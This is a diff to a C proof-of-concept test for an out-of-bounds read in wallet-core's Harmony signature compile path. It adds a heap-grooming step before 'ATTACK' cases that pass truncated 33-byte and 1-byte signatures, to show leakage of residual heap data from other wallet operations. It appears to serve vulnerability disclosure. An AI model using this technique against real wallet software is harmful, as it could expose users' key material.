@@ -62,6 +62,17 @@ int main(void) {
 
     printf("wallet-core Harmony compile OOB read test\n");
     run_case("CONTROL 65-byte signature (legitimate MPC flow)", input, inputLen, sig65, sig65Len, pub, pubLen);
+
+    // Heap-grooming demonstration: free a marker buffer right before the call so the
+    // allocator can place the (tiny) signature vector adjacent to/inside freed memory
+    // containing recognizable markers. Shows the OOB read can disclose residual data
+    // from OTHER wallet operations (the heap-use-after-free case ASan flagged).
+    {
+        uint8_t *marker = (uint8_t *)malloc(64);
+        memset(marker, 0xDE, 64);
+        printf("grooming: freed 64-byte buffer filled with 0xDE markers\n");
+        free(marker);
+    }
     run_case("ATTACK 33-byte signature", input, inputLen, sig33, 33, pub, pubLen);
     run_case("ATTACK 1-byte signature", input, inputLen, sig1, 1, pub, pubLen);
     printf("DONE\n");
